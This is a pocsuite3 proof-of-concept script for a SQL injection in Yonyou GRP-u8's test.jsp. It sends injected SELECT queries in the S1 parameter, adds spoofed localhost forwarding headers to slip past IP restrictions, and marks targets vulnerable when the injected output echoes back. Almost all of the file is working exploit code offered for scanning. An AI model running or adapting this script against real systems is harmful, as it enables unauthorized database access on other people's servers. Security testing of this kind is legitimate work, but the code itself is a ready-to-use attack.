from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '1234'  # ssvid
    version = '1.0'
    name = '用友nc GRP-u8SQL'
    appName = '用友nc GRP-u8SQL'
    appVersion = 'GRP-u8'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''用友 GRP-u8 test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path1 = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"
        path2 = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(user()))"
        vulurl1 =self.url+path1
        vulurl2=self.url+path2
        headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1"}
        try:
            resp1 = requests.get(url=vulurl1,verify = False, allow_redirects = False, timeout=10,headers=headers)
            resp2 = requests.get(url=vulurl2, verify=False, allow_redirects=False, timeout=10, headers=headers)
            if 'MD5(1)' in resp1.text and resp1.status_code == 200 or 'MD5(1)' in resp2.text and resp1.status_code==200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl1
            return self.parse_output(result)
        except:
            pass
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
